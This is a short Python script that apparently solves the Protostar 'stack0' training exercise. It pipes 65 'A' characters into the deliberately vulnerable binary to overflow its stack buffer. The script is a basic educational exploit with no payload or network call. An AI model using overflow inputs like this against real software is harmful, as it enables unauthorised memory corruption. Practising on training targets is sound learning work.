import subprocess

def main():
    flag = ("A" * 65)
    process = "/opt/protostar/stack0"

    # print >> open("flag", 'w'), flag

    sp = subprocess.Popen(process, stdin=subprocess.PIPE)
    sp.communicate(input=flag)

if __name__ == '__main__':
    main()

